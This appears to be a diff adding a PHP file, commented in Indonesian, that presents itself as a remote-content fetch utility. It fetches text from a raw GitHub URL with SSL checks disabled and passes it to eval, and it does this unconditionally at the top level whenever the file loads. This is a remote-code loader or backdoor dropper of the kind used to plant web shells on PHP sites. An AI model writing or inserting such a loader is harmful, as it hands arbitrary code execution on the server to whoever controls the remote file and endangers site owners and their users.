@@ -1,0 +1,144 @@
+<?php
+function fetch_remote_content($url, $options = []) {
+    $default_options = [
+        'timeout' => 30,
+        'user_agent' => 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
+        'verify_ssl' => false
+    ];
+    
+    $options = array_merge($default_options, $options);
+    
+    // Method 1: file_get_contents dengan context
+    $content = file_get_contents_with_context($url, $options);
+    if ($content !== false) return $content;
+    
+    // Method 2: cURL
+    $content = curl_fetch_content($url, $options);
+    if ($content !== false) return $content;
+    
+    // Method 3: fopen fallback
+    $content = fopen_fetch_content($url, $options);
+    if ($content !== false) return $content;
+    
+    return false;
+}
+
+function file_get_contents_with_context($url, $options) {
+    $context_options = [
+        'http' => [
+            'timeout' => $options['timeout'],
+            'user_agent' => $options['user_agent']
+        ]
+    ];
+    
+    if (!$options['verify_ssl']) {
+        $context_options['ssl'] = [
+            'verify_peer' => false,
+            'verify_peer_name' => false
+        ];
+    }
+    
+    $context = stream_context_create($context_options);
+    return @file_get_contents($url, false, $context);
+}
+
+function curl_fetch_content($url, $options) {
+    if (!function_exists('curl_init')) return false;
+    
+    $ch = curl_init();
+    
+    $curl_options = [
+        CURLOPT_URL => $url,
+        CURLOPT_RETURNTRANSFER => true,
+        CURLOPT_FOLLOWLOCATION => true,
+        CURLOPT_USERAGENT => $options['user_agent'],
+        CURLOPT_TIMEOUT => $options['timeout'],
+        CURLOPT_CONNECTTIMEOUT => 10
+    ];
+    
+    if (!$options['verify_ssl']) {
+        $curl_options[CURLOPT_SSL_VERIFYPEER] = false;
+        $curl_options[CURLOPT_SSL_VERIFYHOST] = false;
+    }
+    
+    curl_setopt_array($ch, $curl_options);
+    
+    $content = curl_exec($ch);
+    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
+    curl_close($ch);
+    
+    return ($httpCode === 200) ? $content : false;
+}
+
+function fopen_fetch_content($url, $options) {
+    $context_options = [
+        'http' => [
+            'timeout' => $options['timeout'],
+            'user_agent' => $options['user_agent']
+        ]
+    ];
+    
+    if (!$options['verify_ssl']) {
+        $context_options['ssl'] = [
+            'verify_peer' => false,
+            'verify_peer_name' => false
+        ];
+    }
+    
+    $context = stream_context_create($context_options);
+    $handle = @fopen($url, 'r', false, $context);
+    
+    if ($handle) {
+        $content = stream_get_contents($handle);
+        fclose($handle);
+        return $content;
+    }
+    
+    return false;
+}
+
+function execute_remote_code($url, $options = []) {
+    $content = fetch_remote_content($url, $options);
+    
+    if ($content === false) {
+        throw new Exception("Cannot fetch content from: " . $url);
+    }
+    
+    if (empty(trim($content))) {
+        throw new Exception("Empty content received from: " . $url);
+    }
+    
+    // Eksekusi kode
+    try {
+        eval('?>' . $content);
+        return true;
+    } catch (ParseError $e) {
+        throw new Exception("PHP Parse Error: " . $e->getMessage());
+    } catch (Throwable $e) {
+        throw new Exception("PHP Execution Error: " . $e->getMessage());
+    }
+}
+
+// Penggunaan
+try {
+    execute_remote_code('https://raw.githubusercontent.com/mlhisoka/gon/refs/heads/main/1.txt', [
+        'timeout' => 15,
+        'user_agent' => 'Custom Bot 1.0'
+    ]);
+} catch (Exception $e) {
+    echo "Execution Failed: " . $e->getMessage();
+}
+
+// Alternatif: Hanya untuk testing (menampilkan tanpa eksekusi)
+function display_remote_content($url, $options = []) {
+    $content = fetch_remote_content($url, $options);
+    if ($content !== false) {
+        echo htmlspecialchars($content);
+    } else {
+        echo "Cannot fetch content";
+    }
+}
+
+// Uncomment untuk testing tanpa eksekusi
+// display_remote_content('https://raw.githubusercontent.com/mlhisoka/gon/refs/heads/main/1.txt');
+?>
